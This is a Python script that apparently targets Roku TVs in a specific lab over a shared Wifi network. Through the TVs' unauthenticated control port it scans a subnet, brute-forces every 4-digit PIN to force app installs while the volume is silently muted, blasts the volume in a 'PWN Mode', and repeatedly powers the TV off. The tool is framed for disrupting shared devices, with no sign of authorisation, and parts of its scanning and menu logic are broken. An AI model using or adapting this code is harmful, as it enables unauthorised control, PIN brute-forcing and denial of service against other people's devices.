#!/usr/bin/env python3
##############
# Roku Remote Access ('rokuRA')
# This script allows for remote access (so long as connected to 'Commons' Wifi) to the CASlab Roku TVs.

##############
# The IP Address must match the IP found in the Roku TV settings.
# The IP ADDRESSES ARE DYNAMIC AND MAY CHANGE.
# Room 1 IP Address: 130.15.15.239 (Room 1, closest to goodwin entrance)
# Room 2 IP Address: unknown (Room 2, furthest from goodwin entrance)


# Importing necessary libraries
import requests
import time
import subprocess
from tqdm import tqdm

# Function to check if an app is already installed given the app ID. Returns a Boolean
def check_app_installed(ip, app_id):
    response = requests.get(f"http://{ip}:8060/query/apps")
    return f'<app id="{app_id}"' in response.text

# Function to send keypresses to the Roku TV given the key as a string
def send_keypress(ip, key):
    requests.post(f"http://{ip}:8060/keypress/{key}")

# Function for bruteforcing the 4-digit pin
def try_combinations(ip, app_id):

    for i in range(10000):
        combination = f"{i:04}"
        for digit in combination:
            send_keypress(ip, f"Lit_{digit}")

        send_keypress(ip, "Select")
        if check_app_installed(ip, app_id):
            return True
        
        send_keypress(ip, "Up")
    return False

# Function for installing an app given the app ID
def install_app(ip, app_id):

    # Changing volume down to 0
    for i in tqdm(range(100), desc="Adjusting Volume"):
        send_keypress(ip, "VolumeDown")

    # Attempts to install the app
    requests.post(f"http://{ip}:8060/install/{app_id}")

    if try_combinations(ip, app_id):
        print(f"App {app_id} successfully installed.")

        # Increases volume back up to 15
        for i in tqdm(range(15), desc="Adjusting Volume"):
            send_keypress(ip, "VolumeUp")

    else:
        print(f"Failed to install app {app_id}.")

  

def select_option(ip):
    while True:

        # Display all options
        option = input("\nSelect an Option: \n1. Max out Volume\n2. Minimize Volume\n3. Launch Web Cast\n4. Launch Web Cast (PWN Mode: Be warned!)\n5. Launch Another App\n6. Loop Shutdown\n7. Custom Keystroke\n8. NOT WORKING\n9. Exit\n")
        
        # Option 1, increases the volume to the maximum level
        if option == '1':
            for i in tqdm(range(100), desc="Adjusting Volume"):
                send_keypress(ip, "VolumeUp")
            requests.post(f"http://{ip}:8060/launch/259656")

        if option == '2':
            for i in tqdm(range(100), desc="Adjusting Volume"):
                send_keypress(ip, "VolumeDown")
            requests.post(f"http://{ip}:8060/launch/259656")

        # Option 2, installs any app given the app ID
        elif option == '10':
            app_id = input("Enter the app number: ")
            if check_app_installed(ip, app_id):
                print(f"App {app_id} is already installed")
            else:
                install_app(ip, app_id)

        # Option 3, launches the Web Video Caster application
        elif option == '3':
            requests.post(f"http://{ip}:8060/launch/259656")
            print("App successfully launched! Please download the Web Video Caster application on your phone to interact with the TV.")

        # Option 4, launches the Web Video Caster application and increases the volume to the maximum level
        elif option == '4':
            for i in tqdm(range(100), desc="Adjusting Volume"):
                send_keypress(ip, "VolumeUp")
            requests.post(f"http://{ip}:8060/launch/259656")
 
        # Option 5, launches any app given the app ID
        elif option == '5':
            app_id = input("Enter the app number: ")
            requests.post(f"http://{ip}:8060/launch/{app_id}")
            print("Custom app launched!")

        # Option 6, continuously powers off the TV
        elif option == '6':
            print("Powering off the TV. Press Ctrl+C to exit.")
            while True:
                try:
                    send_keypress(ip, "PowerOff")
                    time.sleep(1)
                except KeyboardInterrupt:
                    break

        
        elif option == '7':
            keystroke = input("Enter the key ID: ")
            send_keypress(ip, keystroke)


        # Option 8, exits the script
        elif option == '9':
            exit()
        else:
            print("Invalid option, please try again.")







# The base IP address is set to ###.###.##.____ where the last 3 digits are missing
base_ip = ""

print("""
            _          _____            
           | |        |  __ \     /\    
  _ __ ___ | | ___   _| |__) |   /  \   
 | '__/ _ \| |/ / | | |  _  /   / /\ \  
 | | | (_) |   <| |_| | | \ \  / ____ \ 
 |_|  \___/|_|\_|\__,_|_|  \_\/_/    \_\ """)

# Prompts for the ip address, and if it is empty it will attempt to automatically detect the ip address
ip = input("\nEnter the IP Address of the Roku TV (no input will result in automatic detection): ")

# automatic detection
if ip == "":
    base_ip = input("Enter the base IP: ")
    timeout = input("\n Please input the delay between each scan, higher values will result in a slower scan but lower values may skip over the device: ")
    # Iterate through the last octet from 255 to 0
    for i in range(255, -1, -1):
        # Construct the full IP address
        ip = f"{base_ip}.{i}"
        url = f"http://{ip}:8060/query/device-info"

        if i == 0:
            print("No Roku device found.")
            exit()

        try:
            # Send a request to the Roku device info endpoint
            response = requests.get(url, timeout=float(timeout))  # Timeout set to 0.5 seconds to speed up the scan
            if response.status_code == 200:
                print(f"Possible Roku found at: {ip}")
                continue
        except requests.ConnectionError:
            # If the connection fails, just continue to the next IP
            print(f"Connection error, moving to next ip, {i}")
            continue
        except requests.Timeout:
            # If the request times out, continue to the next IP
            print("Timeout, moving to next ip, {i}")
            continue

print("Scan completed.")
select_option(ip)
